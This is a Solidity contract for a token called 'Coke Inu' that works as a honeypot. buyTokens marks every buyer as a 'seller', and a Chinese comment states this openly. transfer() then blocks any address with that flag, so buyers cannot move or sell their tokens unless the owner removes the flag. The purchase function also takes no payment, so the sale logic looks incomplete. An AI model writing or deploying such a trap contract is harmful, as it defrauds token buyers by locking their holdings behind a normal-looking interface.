// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CokeInuToken {
    string public name = "Coke Inu";
    string public symbol = "CIT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000000 * 10 ** uint256(decimals);
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isSeller;
    mapping(address => bool) public hasBought;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function.");
        _;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance.");
        require(to != address(0), "Invalid address.");
        require(!isSeller[msg.sender], "Sellers are not allowed to transfer tokens.");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    // 修改购买者为出售者，并标记为已出售
    function buyTokens(uint256 value) public {
        require(balanceOf[owner] >= value, "Insufficient balance in the contract.");
        require(!hasBought[msg.sender], "Buyer has already purchased tokens.");
        balanceOf[owner] -= value;
        balanceOf[msg.sender] += value;
        isSeller[msg.sender] = true; // 标记购买者为出售者
        hasBought[msg.sender] = true; // 标记购买者已购买代币
        emit Transfer(owner, msg.sender, value);
    }

    function addSeller(address seller) public onlyOwner {
        isSeller[seller] = true;
    }

    function removeSeller(address seller) public onlyOwner {
        isSeller[seller] = false;
    }
}